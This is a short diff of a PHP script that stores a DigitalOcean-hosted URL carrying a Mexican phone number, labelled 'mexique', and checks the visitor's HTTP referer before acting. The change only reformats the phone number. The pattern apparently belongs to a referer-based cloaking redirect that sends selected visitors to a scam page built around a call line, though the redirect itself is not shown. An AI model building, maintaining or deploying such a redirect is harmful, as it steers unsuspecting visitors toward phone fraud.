@@ -9,7 +9,7 @@
 
     $lanzar=true;
     
-    $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=+52 74 4362 0212'; //mexique
+    $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=+52-74-4362-0212'; //mexique
 
     $encontrado=true;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
